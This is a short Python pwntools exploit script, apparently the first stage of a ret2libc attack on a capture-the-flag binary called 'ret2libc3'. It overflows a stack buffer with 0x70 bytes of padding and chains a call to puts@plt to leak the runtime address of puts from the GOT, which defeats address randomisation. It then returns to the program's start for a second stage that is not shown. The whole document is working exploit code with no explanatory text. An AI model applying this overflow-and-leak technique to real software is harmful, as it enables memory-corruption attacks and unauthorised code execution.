from pwn import *
from Crypto.Util.number import bytes_to_long

sh = process('./ret2libc3')

start_adr = 0x80484d0
puts_plt = 0x8048460
puts_adr = 0x804a024

payload = b'a'*0x70+p32(puts_plt)+p32(start_adr)+p32(puts_adr)

sh.recv()
sh.sendline(payload)

puts_real_adr = u32(sh.recv(4))
print(hex(puts_real_adr))